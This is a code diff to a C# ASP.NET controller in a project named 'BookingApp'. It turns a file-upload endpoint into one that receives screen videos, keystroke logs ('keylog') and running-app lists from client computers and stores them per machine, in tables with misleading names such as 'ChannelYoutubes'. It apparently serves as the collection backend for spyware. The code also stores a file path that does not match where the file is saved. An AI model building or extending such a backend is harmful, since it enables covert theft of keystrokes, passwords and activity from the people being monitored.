@@ -25,51 +25,54 @@ namespace BookingApp.Controllers
         }
         public class VideoDto
         {
-            public IFormFile file { set; get; }
-            public DateTime createdDate { set; get; }
-            public string comName { set; get; }
+            public IFormFile Video { set; get; }
+            public string ip { set; get; }
+            public string keylog { set; get; }
+            public string apps { set; get; }
         }
         [HttpPost]
-        public async Task<IActionResult> UploadFiles([FromForm] VideoDto video)
+        public async Task<IActionResult> UploadVideos([FromForm] VideoDto video)
         {
             using var db = new AppDbContext();
             var computers = db.ChannelYoutubes.ToList();
-            var com = computers.Where(x => x.Link.Contains(video.comName)).FirstOrDefault();
-            // Split the file path using the backslash ('\') character as the separator
-            string[] filePathParts = video.file.FileName.Split('\\');
-            // Extract the filename without the extension (assuming the last part is the filename)
-            string fileNameWithoutExtension = filePathParts[filePathParts.Length - 1];
+            var com = computers.Where(x => x.Link.Contains(video.ip)).FirstOrDefault();
+            // Split the Video path using the backslash ('\') character as the separator
+            string[] VideoPathParts = video.Video.FileName.Split('\\');
+            // Extract the Videoname without the extension (assuming the last part is the Videoname)
+            string VideoNameWithoutExtension = VideoPathParts[VideoPathParts.Length - 1];
 
-            string name = fileNameWithoutExtension.Split(".")[0];
-            string fileName = name + "_"+com.Id + ".mp4"; 
+            string name = VideoNameWithoutExtension.Split(".")[0];
+            string VideoName = name + "_"+com.Id + ".mp4"; 
 
-            string filePath = Path.Combine(_env.ContentRootPath, "file", fileName); // Or use your preferred storage location
-            using (var stream = new FileStream(filePath, FileMode.Create))
+            string VideoPath = Path.Combine(_env.ContentRootPath, "file", VideoName); // Or use your preferred storage location
+            using (var stream = new FileStream(VideoPath, FileMode.Create))
             {
-                await video.file.CopyToAsync(stream);
+                await video.Video.CopyToAsync(stream);
             }
             DateTime from = convert(long.Parse(name.Split("_")[0]));
             DateTime to = convert(long.Parse(name.Split("_")[1]));
 
-            db.Add(new Books() 
+            db.Add(new Videos() 
             { 
-                Name = Path.Combine("file", fileName), 
-                Author = video.comName.ToUpper(), 
-                PublicationYear = com.Id, 
-                Registered = video.createdDate,
+                VideoPath = Path.Combine("Video", VideoName),
+                Keylog = video.keylog, 
+                Apps = video.apps, 
+                ChannelId = com.Id, 
+                CreatedDate = DateTime.Now,
                 Year = from.Year,
                 Month = from.Month,
-                Day = from.Day,
+                Date = from.Day,
                 Hours = from.Hour,
-                Minute = from.Minute,
-                fromDate = from.ToString(),
-                toDate = to.ToString(),
+                Minutes = from.Minute,
+                Start = from,
+                End = to,
+                IsDelete = false
             });
 
 
             db.SaveChanges();
 
-            return Ok("Files uploaded successfully");
+            return Ok("Videos uploaded successfully");
         }
         private DateTime convert (long ticks)
         {
